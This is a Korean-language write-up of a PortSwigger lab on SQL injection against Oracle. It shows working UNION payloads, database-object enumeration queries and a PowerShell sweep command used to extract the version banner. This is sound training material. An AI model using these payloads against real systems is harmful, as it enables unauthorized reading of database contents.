---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
draft: false
---

# SQL injection attack, querying the database type and version on Oracle

실습 설명에서 출력해야 할 문자열은 알 수 있었지만, 어느 객체에 있는지는 몰랐다. **소유자를 포함한 버전 관련 객체 9개를 스크립트로 전부 검사**해 출처를 찾았다. 아래 쿼리와 결과는 실습 인스턴스에서 확인했다.

## 1. 조회 형태 확인

`category`에 `' ORDER BY 1 --`, `' ORDER BY 2 --`, `' ORDER BY 3 --`을 차례로 넣었다. 1과 2는 처리되고 3은 HTTP 500이어서 반환 열을 두 개로 판단했다. 다음 요청으로 뷰 이름을 첫 번째 열에 출력해 문자열 출력도 확인했다.

~~~sql
' UNION SELECT view_name, NULL FROM all_views --
~~~

![뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

**다음:** 이름만 수집하면 `FROM`에 쓸 때 소유자를 놓칠 수 있다. 버전 관련 객체를 소유자와 함께 열거한다.

## 2. 소유자 포함 객체 9개와 버전 표식 얻기

~~~sql
' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

응답에는 서로 다른 객체 9개가 나왔다. `ALL_TAB_COLUMNS`는 객체의 열마다 한 행이므로 `UNION ALL`로 객체명만 출력하면 중복된다. 여기서는 중복을 제거하는 `UNION`을 썼다.

이름만으로 어느 열에 버전 문구가 있는지 알 수 없어, 먼저 이해하기 쉬운 제품 버전 정보를 조회했다.

~~~sql
' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
FROM PRODUCT_COMPONENT_VERSION --
~~~

`Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production` 등을 포함한 **네 행**이 나왔다. 여기서 검색 표식 `11.2.0.2.0`을 얻었다. 하지만 `CORE` 행은 없고 화면은 **Not solved**였다.

![제품 버전 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)

**다음:** 이 표식을 기준으로 9개 객체의 열을 빠짐없이 검사한다.

## 3. PowerShell로 9개 객체 전수 조회

[전수 조회 스크립트](https://github.com/ddomology/portswigger-lab-notes/blob/main/scripts/oracle-version-sweep.ps1)는 `ALL_TAB_COLUMNS`에서 9개 객체와 **48개 열**을 읽는다. 객체명은 `OWNER.TABLE_NAME`으로 보관한다. 각 객체의 행 수를 확인한 뒤, 행이 있는 객체의 모든 열을 소유자 포함 이름으로 조회해 `11.2.0.2.0`이 들어간 값을 찾는다. 결과는 열당 최대 20건만 출력한다.

~~~powershell
pwsh -File .\scripts\oracle-version-sweep.ps1 `
  -BaseUrl 'https://YOUR-LAB.web-security-academy.net' `
  -Marker '11.2.0.2.0' `
  -OutputPath 'version-sweep.json'
~~~

| 소유자 포함 객체 | 행 수 | 표식 일치 결과 |
| --- | ---: | --- |
| `SYS.ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.ALL_TYPE_VERSIONS` | 10,191 | 없음 |
| `SYS.GV_$VERSION` | 5 | `BANNER` 다섯 행 |
| `SYS.PRODUCT_COMPONENT_VERSION` | 4 | `VERSION` 네 행 |
| `SYS.SM_$VERSION` | 1 | 없음 |
| `SYS.USER_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.USER_TYPE_VERSIONS` | 0 | 없음 |
| `SYS.V_$VERSION` | 5 | `BANNER` 다섯 행 |
| `SYS._ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |

행이 없는 네 객체는 값을 조회할 필요가 없었다. 나머지 객체의 **17개 열**을 검사해 총 14개 일치 행을 얻었다. `ALL_TYPE_VERSIONS`의 열을 한 요청으로 묶은 조회는 HTTP 400이어서, 스크립트가 8개 열을 개별 재시도했다. 모두 HTTP 200이었고 일치값은 없었다.

`GV_$VERSION.BANNER`와 `V_$VERSION.BANNER`가 목표 문자열 다섯 개를 그대로 반환했다. 반면 `PRODUCT_COMPONENT_VERSION.VERSION`은 버전 번호 네 개만 반환했다. 따라서 `BANNER`를 직접 출력해 실습 판정을 확인했다.

## 4. 찾은 열로 최종 확인

~~~sql
' UNION ALL SELECT "BANNER", NULL FROM "SYS"."V_$VERSION" --
~~~

HTTP 200 응답에 다음 다섯 행이 나왔고, 상태가 **LAB Solved**로 바뀌었다.

~~~text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
~~~

## 당시 HTTP 500의 원인

첫 반복 시도는 `OWNER`를 저장하지 않고 `FROM "V_$VERSION"`처럼 객체명만 사용했다. 문자열 열 조회와 `COUNT(*)` 조회가 모두 500이었다. 같은 뷰를 `FROM "SYS"."V_$VERSION"`으로 조회하자 행 수 5와 `BANNER` 값이 정상 반환됐다. 즉 **이 시도의 500은 소유자를 빠뜨린 객체 참조 때문**이었다. 응답에는 Oracle 오류 번호가 없어 정확한 `ORA-` 코드는 확인하지 못했다.

## 참고

- [Oracle: ALL_TAB_COLUMNS의 OWNER 열](https://docs.oracle.com/cd/E18283_01/server.112/e17110/statviews_2103.htm)
